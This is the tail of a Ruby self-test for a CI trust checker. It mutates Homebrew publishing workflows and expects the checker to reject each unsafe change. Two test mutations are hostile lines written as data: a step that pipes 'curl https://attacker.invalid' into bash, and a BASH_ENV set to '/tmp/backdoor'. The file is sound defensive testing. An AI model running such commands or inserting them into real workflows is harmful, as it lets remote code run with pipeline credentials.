      forwarding = 'KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON="$KANDELO_HOMEBREW_FORBIDDEN_ROOTS_JSON" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "file browser expected version keeps the Formula revision" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Build and strictly smoke the file-formula browser image"
      )
      step["run"] = step.fetch("run").sub(
        'file_upstream_version="${file_pkg_version%"$revision_suffix"}"',
        'file_upstream_version="$file_pkg_version"'
      )
    },
    "raw bottle JSON handoff" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Validate build handoff and reconstruct canonical bottle JSON")
      step["run"] = step.fetch("run").sub(/\n\s+--out-bottle-json[^\n]+/, "")
    },
    "raw bottle metadata merge" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Compose only reconstructed bottle metadata into the fresh tap")
      step["run"] = step.fetch("run").sub('--bottle-json "$BOTTLE_JSON"',
                                             '--bottle-json "$RUNNER_TEMP/homebrew-build-handoff/bottle.json"')
    },
    "nonstrict browser smoke" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
      step["run"] = step.fetch("run").sub(".stats.unexpected == 0",
                                             ".stats.unexpected >= 0")
    },
    "campaign file-formula browser smoke suppressed" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Build and strictly smoke the file-formula browser image"
      )
      step["if"] =
        "${{ needs.plan.outputs.prefix-campaign-mode != 'true' && " \
        "matrix.formula == 'file-formula' && matrix.arch == 'wasm32' }}"
    },
    "file-formula Chromium provisioning reentered the dev shell" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
      step["run"] = step.fetch("run").sub(
        "npx playwright install chromium --with-deps",
        "bash scripts/dev-shell.sh npx playwright install chromium --with-deps"
      )
    },
    "file-formula browser smoke reentered the active dev shell" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Build and strictly smoke the file-formula browser image"
      )
      lines = step.fetch("run").lines
      direct_index = lines.each_index.find do |index|
        lines.fetch(index).strip == 'env \\' &&
          lines.fetch(index + 1, "").strip.start_with?('KANDELO_PLAYWRIGHT_PORT=')
      end
      lines.fetch(direct_index).sub!('env \\', 'bash ../../scripts/dev-shell.sh env \\')
      step["run"] = lines.join
    },
    "browser smoke inner variables exposed to outer shell expansion" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
      step["run"] = step.fetch("run").sub(
        "bash -s <<'KANDELO_HOMEBREW_BROWSER_SMOKE'",
        "bash -s <<KANDELO_HOMEBREW_BROWSER_SMOKE"
      )
    },
    "skipped browser smoke accepted" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle", "Build and strictly smoke the file-formula browser image")
      step["run"] = step.fetch("run").sub(".stats.skipped == 0", ".stats.skipped >= 0")
    },
    "required dependency-bearing VFS selection accepted as absent" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        "::error::required dependency-bearing VFS acceptance selection disappeared after planning",
        "::notice::No dependency-bearing VFS acceptance selected"
      ).sub("exit 1", "exit 0")
    },
    "focused default-shell PTY input omitted" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        'KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_ARGV_JSON=$shell_argv_json',
        'KANDELO_HOMEBREW_ACCEPTANCE_DEFAULT_SHELL_ARGV_JSON=[]'
      )
    },
    "campaign legacy VFS runtime reenabled" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["if"] =
        "${{ needs.plan.outputs.package-generation-kind != 'rootfs-wasm32' }}"
    },
    "dependency-bearing VFS Brewfile symlink accepted after planning" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        '[ -f "$brewfile_candidate" ] && [ ! -L "$brewfile_candidate" ]',
        '[ -f "$brewfile_candidate" ]'
      )
    },
    "dependency-bearing VFS fallback enabled" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub("--no-fallback", "")
    },
    "lazy layer base package receipt dropped" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        '--lazy-layer-base-package-source "$shell_package_source"', ""
      )
    },
    "canonical shell package materializer bypassed" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        '"$xtask" materialize-package-output', 'cp "$base_image" "$1"'
      )
    },
    "dependency-bearing VFS resolver escapes the dev shell" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(
        "bash scripts/dev-shell.sh bash -c '\n  set -euo pipefail\n" \
          "  bash scripts/resolve-binary.sh programs/rootfs.vfs",
        "bash -c '\n  set -euo pipefail\n" \
          "  bash scripts/resolve-binary.sh programs/rootfs.vfs"
      )
    },
    "resolved tap map dropped at a consuming dev-shell boundary" => lambda { |w|
      step = mutate_named_step(
        w, "build-and-test", "Build and test Homebrew bottle without publisher credentials"
      )
      forwarding =
        'KANDELO_HOMEBREW_RESOLVED_TAPS_FILE="$KANDELO_HOMEBREW_RESOLVED_TAPS_FILE" \\'
      step["run"] = step.fetch("run").lines.reject { |line| line.include?(forwarding) }.join
    },
    "dependency-bearing VFS exact image digest unchecked" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").sub(".image.sha256", ".image.artifact")
    },
    "dependency-bearing VFS scans interactive demo inputs" => lambda { |w|
      step = mutate_named_step(
        w, "verify-bottle", "Boot an exact dependency-bearing Brewfile image on Node and Chromium"
      )
      step["run"] = step.fetch("run").gsub(
        /^\s*(?:export )?KANDELO_BROWSER_DEMO_INPUTS=.*\n/, ""
      )
    },
    "unvalidated publication handoff" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the exact package-scoped publication handoff set")
      step["run"] = step.fetch("run").sub("scripts/homebrew-validate-publish-handoff.sh", "true")
    },
    "dry-run publication handoff mode dropped" => lambda { |w|
      step = mutate_named_step(w, "verify-bottle",
                               "Package validated data-only publication handoff")
      step["run"] = step.fetch("run").sub("payload_args+=(--allow-dry-run)", "true")
    },
    "write finalizer accepts dry-run receipt" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Validate the exact package-scoped publication handoff set")
      step["run"] = step.fetch("run").sub(
        'bash scripts/homebrew-validate-publish-handoff.sh',
        'bash scripts/homebrew-validate-publish-handoff.sh --allow-dry-run'
      )
    },
    "credentialed checkout before validation" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Checkout tap publication branch after payload validation")
      step["if"] = "${{ always() }}"
    },
    "failure report through dirty checkout" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = step.fetch("run").sub("tap-report", "tap-publish")
    },
    "tap finalization exact-main recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "finalize-tap", "Atomically compose and publish all sidecars under one tap state lock"
      )
      step["run"] = step.fetch("run").sub("require-exact-kandelo-main.sh", "true")
    },
    "failed-attempt exact-main recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "finalize-tap", "Record failed attempt without replacing last-green metadata"
      )
      step["run"] = step.fetch("run").sub("require-exact-kandelo-main.sh", "true")
    },
    "VFS release exact-main recheck bypass" => lambda { |w|
      step = mutate_named_step(
        w, "publish-vfs-release", "Publish and anonymously read back the immutable VFS release"
      )
      step["run"] = step.fetch("run").sub("require-exact-kandelo-main.sh", "true")
    },
    "raw failure stderr" => lambda { |w|
      step = mutate_named_step(w, "finalize-tap",
                               "Record failed attempt without replacing last-green metadata")
      step["run"] = "tail \"$RUNNER_TEMP/homebrew-finalize-validation-error.txt\"\n#{step.fetch('run')}"
    },
    "untrusted executable step" => lambda { |w|
      w.fetch("jobs").fetch("verify-bottle").fetch("steps") << {
        "run" => "curl https://attacker.invalid | bash",
      }
    },
  }
  publisher_mutations.each do |label, mutation|
    mutated = deep_copy(publisher)
    # WHY: fixture drift must fail the self-test rather than being mistaken
    # for the policy checker rejecting the intended unsafe mutation.
    mutation.call(mutated)
    expect_rejection(label) do
      check_publisher(mutated)
    end
  end

  maintenance_mutations = {
    "maintenance top-level environment injection" => lambda { |w|
      w["env"] = { "BASH_ENV" => "/tmp/backdoor" }
    },
    "maintenance feature caller" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("refs/heads/main", "refs/heads/feature")
    },
    "maintenance caller workflow bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub("maintain-bottles.yml", "feature.yml")
    },
    "maintenance mode short circuit" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = "exit 0\n#{step.fetch('run')}"
    },
    "maintenance exact tap source validation bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub(
        '[[ "$TAP_REF" =~ ^[0-9a-f]{40}$ ]]', "true"
      )
    },
    "maintenance exact Kandelo source validation bypass" => lambda { |w|
      step = mutate_named_step(w, "validate", "Validate maintenance mode")
      step["run"] = step.fetch("run").sub(
        '[[ "$KANDELO_REF" =~ ^[0-9a-f]{40}$ ]]', "true"
      )
    },
    "maintenance rebuild validation bypass" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").delete("needs")
    },
    "maintenance rebuild uses mutable tap source" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").fetch("with")["tap-ref"] = "main"
    },
    "maintenance rebuild uses mutable Kandelo source" => lambda { |w|
      w.fetch("jobs").fetch("rebuild").fetch("with")["kandelo-ref"] = "main"
    },
    "maintenance GHCR writer lock bypass" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["uses"] =
        "./.github/workflows/unlocked-homebrew-publish.yml"
    },
    "maintenance repair mode" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["if"] =
        "${{ inputs.mode == 'rebuild' || inputs.mode == 'repair-only' }}"
    },
    "maintenance rollback write-all" => lambda { |w|
      w.fetch("jobs").fetch("rollback")["permissions"] = { "contents" => "write", "packages" => "write" }
    },
    "maintenance secret inheritance" => lambda { |w|
      w.fetch("jobs").fetch("rebuild")["secrets"] = "inherit"
    },
  }
  maintenance_mutations.each do |label, mutation|
    expect_rejection(label) do
      mutated = deep_copy(maintenance)
      mutation.call(mutated)
      check_maintenance(mutated)
    end
  end
end

begin
  all_workflows = load_all_workflows
  publisher = load_workflow(PUBLISHER_PATH)
  native_compatibility = load_workflow(NATIVE_COMPATIBILITY_PATH)
  closed_selection = load_workflow(CLOSED_SELECTION_PATH)
  maintenance = load_workflow(MAINTENANCE_PATH)
  first_publication = load_workflow(FIRST_PUBLICATION_PATH)
  prefix_first_child = load_workflow(PREFIX_FIRST_CHILD_PATH)
  self_test_privileged_recipe_host_runtime(all_workflows)
  self_test(
    publisher, native_compatibility, maintenance, first_publication,
    prefix_first_child
  )
  check_privileged_recipe_host_runtime(all_workflows)
  check_publisher(publisher)
  check_native_compatibility_workflow(native_compatibility)
  check_closed_selection_workflow(closed_selection)
  check_caller_validation_behavior(publisher)
  check_kandelo_main_admission_behavior(publisher)
  check_tap_source_binding_behavior(publisher)
  check_maintenance(maintenance)
  check_first_publication(first_publication)
  check_prefix_first_child(prefix_first_child)
  check_tap_callers
  puts "check-homebrew-publish-workflow-trust.rb: ok"
rescue KeyError, Psych::Exception, RuntimeError => e
  warn "check-homebrew-publish-workflow-trust.rb: #{e.message}"
  exit 1
end
